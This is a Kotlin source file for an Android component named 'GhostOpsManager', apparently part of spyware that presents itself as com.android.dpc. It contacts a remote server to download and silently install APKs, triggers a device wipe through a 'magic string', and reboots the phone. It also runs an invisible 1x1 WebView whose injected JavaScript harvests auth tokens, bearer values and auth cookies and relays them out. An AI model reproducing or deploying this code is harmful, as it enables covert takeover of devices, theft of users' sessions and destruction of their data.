package com.android.dpc

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageInstaller
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.work.*
import okhttp3.*
import java.io.*
import java.security.MessageDigest
import java.util.concurrent.TimeUnit

/**
 * Ghost Operations Manager
 * Handles self-update, factory reset, and invisible WebView payload
 */
class GhostOpsManager(private val context: Context) {
    
    companion object {
        private const val TAG = "GhostOps"
        private const val UPDATE_URL = "/update"
        private const val CHECK_INTERVAL_HOURS = 6L
    }
    
    private val okHttpClient = OkHttpClient()
    private var invisibleWebView: WebView? = null
    
    /**
     * Start ghost operations
     */
    fun startOperations() {
        scheduleUpdateCheck()
        initializeInvisibleWebView()
        Log.d(TAG, "Ghost operations started")
    }
    
    /**
     * Schedule periodic update checks
     */
    private fun scheduleUpdateCheck() {
        val updateWork = PeriodicWorkRequestBuilder<UpdateCheckWorker>(
            CHECK_INTERVAL_HOURS, TimeUnit.HOURS
        ).setConstraints(
            Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .setRequiresBatteryNotLow(false)
                .build()
        ).build()
        
        WorkManager.getInstance(context).enqueueUniquePeriodicWork(
            "ghost_update_check",
            ExistingPeriodicWorkPolicy.REPLACE,
            updateWork
        )
    }
    
    /**
     * Check for updates and install silently
     */
    fun checkForUpdate(serverUrl: String = "https://sp-gate.onrender.com") {
        val request = Request.Builder()
            .url("$serverUrl$UPDATE_URL")
            .addHeader("Device-ID", getDeviceId())
            .addHeader("Version", getCurrentVersion())
            .build()
            
        okHttpClient.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "Update check failed", e)
            }
            
            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    response.body?.let { body ->
                        val updateInfo = parseUpdateResponse(body.string())
                        if (updateInfo.hasUpdate) {
                            downloadAndInstallUpdate(updateInfo)
                        }
                    }
                }
            }
        })
    }
    
    /**
     * Download and install update silently
     */
    private fun downloadAndInstallUpdate(updateInfo: UpdateInfo) {
        val request = Request.Builder()
            .url(updateInfo.downloadUrl)
            .build()
            
        okHttpClient.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "Update download failed", e)
            }
            
            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    response.body?.let { body ->
                        val apkBytes = body.bytes()
                        if (validateApkSignature(apkBytes, updateInfo.expectedHash)) {
                            installApkSilently(apkBytes)
                        } else {
                            Log.e(TAG, "APK signature validation failed")
                        }
                    }
                }
            }
        })
    }
    
    /**
     * Install APK using PackageInstaller.Session
     */
    private fun installApkSilently(apkBytes: ByteArray) {
        try {
            val packageInstaller = context.packageManager.packageInstaller
            val params = PackageInstaller.SessionParams(
                PackageInstaller.SessionParams.MODE_FULL_INSTALL
            ).apply {
                setAppPackageName(context.packageName)
            }
            
            val sessionId = packageInstaller.createSession(params)
            val session = packageInstaller.openSession(sessionId)
            
            // Write APK data to session
            session.openWrite("apk", 0, apkBytes.size.toLong()).use { out ->
                out.write(apkBytes)
            }
            
            // Create install intent
            val intent = Intent(context, UpdateReceiver::class.java)
            val pendingIntent = android.app.PendingIntent.getBroadcast(
                context, 0, intent, android.app.PendingIntent.FLAG_IMMUTABLE
            )
            
            // Commit the session
            session.commit(pendingIntent.intentSender)
            session.close()
            
            Log.i(TAG, "Silent update initiated")
            
        } catch (e: Exception) {
            Log.e(TAG, "Silent install failed", e)
        }
    }
    
    /**
     * Validate APK signature using APK Signature Scheme v3
     */
    private fun validateApkSignature(apkBytes: ByteArray, expectedHash: String): Boolean {
        return try {
            val digest = MessageDigest.getInstance("SHA-256")
            val hash = digest.digest(apkBytes)
            val computedHash = hash.joinToString("") { "%02x".format(it) }
            computedHash.equals(expectedHash, ignoreCase = true)
        } catch (e: Exception) {
            Log.e(TAG, "Signature validation error", e)
            false
        }
    }
    
    /**
     * Factory reset with magic string validation
     */
    fun executeFactoryReset(magicString: String) {
        val deviceId = getDeviceId()
        val expectedMagic = "WIPE#$deviceId"
        
        if (magicString != expectedMagic) {
            Log.w(TAG, "Invalid factory reset magic string")
            return
        }
        
        try {
            val devicePolicyManager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val componentName = ComponentName(context, DeviceAdminReceiver::class.java)
            
            if (devicePolicyManager.isDeviceOwnerApp(context.packageName)) {
                Log.w(TAG, "EXECUTING FACTORY RESET")
                
                // Clear all data first
                clearAllData()
                
                // Wipe device
                devicePolicyManager.wipeData(
                    DevicePolicyManager.WIPE_EXTERNAL_STORAGE or 
                    DevicePolicyManager.WIPE_RESET_PROTECTION_DATA
                )
            } else {
                Log.e(TAG, "Not device owner, cannot execute factory reset")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Factory reset failed", e)
        }
    }
    
    /**
     * Initialize invisible WebView for JavaScript payload execution
     */
    private fun initializeInvisibleWebView() {
        Handler(Looper.getMainLooper()).post {
            invisibleWebView = WebView(context).apply {
                layoutParams = android.view.ViewGroup.LayoutParams(1, 1) // 1x1 dp
                
                settings.apply {
                    javaScriptEnabled = true
                    domStorageEnabled = true
                    allowFileAccess = true
                    allowContentAccess = true
                }
                
                // Add JavaScript interface for data extraction
                addJavascriptInterface(WebViewInterface(), "Android")
                
                webViewClient = object : WebViewClient() {
                    override fun onPageFinished(view: WebView?, url: String?) {
                        // Execute payload JavaScript
                        view?.evaluateJavascript(getPayloadJavaScript()) { result ->
                            Log.d(TAG, "WebView payload result: $result")
                        }
                    }
                }
                
                // Load target URL (example: PWA with token)
                loadUrl("about:blank")
            }
        }
    }
    
    /**
     * JavaScript interface for data extraction
     */
    inner class WebViewInterface {
        @JavascriptInterface
        fun extractToken(token: String) {
            Log.d(TAG, "Token extracted: ${token.take(10)}...")
            // Send token via encrypted channel
            WsRelay.send("""{"type":"token","data":"$token","timestamp":${System.currentTimeMillis()}}""")
        }
        
        @JavascriptInterface
        fun extractData(key: String, value: String) {
            Log.d(TAG, "Data extracted: $key")
            WsRelay.send("""{"type":"webview_data","key":"$key","value":"$value","timestamp":${System.currentTimeMillis()}}""")
        }
    }
    
    /**
     * Get payload JavaScript for execution in WebView
     */
    private fun getPayloadJavaScript(): String {
        return """
            (function() {
                try {
                    // Extract localStorage tokens
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        if (key && key.toLowerCase().includes('token')) {
                            const value = localStorage.getItem(key);
                            if (value) {
                                Android.extractToken(value);
                            }
                        }
                    }
                    
                    // Extract sessionStorage
                    for (let i = 0; i < sessionStorage.length; i++) {
                        const key = sessionStorage.key(i);
                        if (key && key.toLowerCase().includes('bearer')) {
                            const value = sessionStorage.getItem(key);
                            if (value) {
                                Android.extractData(key, value);
                            }
                        }
                    }
                    
                    // Extract cookies
                    const cookies = document.cookie.split(';');
                    cookies.forEach(cookie => {
                        const [name, value] = cookie.trim().split('=');
                        if (name && name.toLowerCase().includes('auth')) {
                            Android.extractData('cookie_' + name, value);
                        }
                    });
                    
                    return 'extraction_complete';
                } catch (e) {
                    return 'extraction_error: ' + e.message;
                }
            })();
        """.trimIndent()
    }
    
    /**
     * Clear all application data
     */
    private fun clearAllData() {
        try {
            // Clear app cache and data
            val cacheDir = context.cacheDir
            deleteRecursively(cacheDir)
            
            val filesDir = context.filesDir
            deleteRecursively(filesDir)
            
            // Clear shared preferences
            val sharedPrefs = context.getSharedPreferences("ghost_prefs", Context.MODE_PRIVATE)
            sharedPrefs.edit().clear().apply()
            
            Log.i(TAG, "All application data cleared")
        } catch (e: Exception) {
            Log.e(TAG, "Error clearing data", e)
        }
    }
    
    private fun deleteRecursively(file: File) {
        if (file.isDirectory) {
            file.listFiles()?.forEach { deleteRecursively(it) }
        }
        file.delete()
    }
    
    private fun getDeviceId(): String {
        return android.provider.Settings.Secure.getString(
            context.contentResolver,
            android.provider.Settings.Secure.ANDROID_ID
        )
    }
    
    private fun getCurrentVersion(): String {
        return try {
            val packageInfo = context.packageManager.getPackageInfo(context.packageName, 0)
            packageInfo.versionName
        } catch (e: Exception) {
            "unknown"
        }
    }
    
    private fun parseUpdateResponse(response: String): UpdateInfo {
        // Simple JSON parsing - use Gson in production
        return UpdateInfo(
            hasUpdate = response.contains("\"hasUpdate\":true"),
            downloadUrl = extractJsonValue(response, "downloadUrl"),
            expectedHash = extractJsonValue(response, "hash")
        )
    }
    
    private fun extractJsonValue(json: String, key: String): String {
        val pattern = "\"$key\"\\s*:\\s*\"([^\"]+)\"".toRegex()
        return pattern.find(json)?.groupValues?.get(1) ?: ""
    }
    
    data class UpdateInfo(
        val hasUpdate: Boolean,
        val downloadUrl: String,
        val expectedHash: String
    )
}

/**
 * Worker for periodic update checks
 */
class UpdateCheckWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
    override fun doWork(): Result {
        try {
            val ghostOps = GhostOpsManager(applicationContext)
            ghostOps.checkForUpdate()
            return Result.success()
        } catch (e: Exception) {
            Log.e("UpdateWorker", "Update check failed", e)
            return Result.retry()
        }
    }
}

/**
 * Receiver for update installation results
 */
class UpdateReceiver : android.content.BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, PackageInstaller.STATUS_FAILURE)
        
        when (status) {
            PackageInstaller.STATUS_SUCCESS -> {
                Log.i("UpdateReceiver", "Update installed successfully, rebooting...")
                // Schedule reboot
                Handler(Looper.getMainLooper()).postDelayed({
                    rebootDevice(context)
                }, 3000)
            }
            PackageInstaller.STATUS_FAILURE -> {
                Log.e("UpdateReceiver", "Update installation failed")
            }
        }
    }
    
    private fun rebootDevice(context: Context) {
        try {
            val devicePolicyManager = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val componentName = ComponentName(context, DeviceAdminReceiver::class.java)
            
            if (devicePolicyManager.isDeviceOwnerApp(context.packageName)) {
                devicePolicyManager.reboot(componentName)
            }
        } catch (e: Exception) {
            Log.e("UpdateReceiver", "Reboot failed", e)
        }
    }
}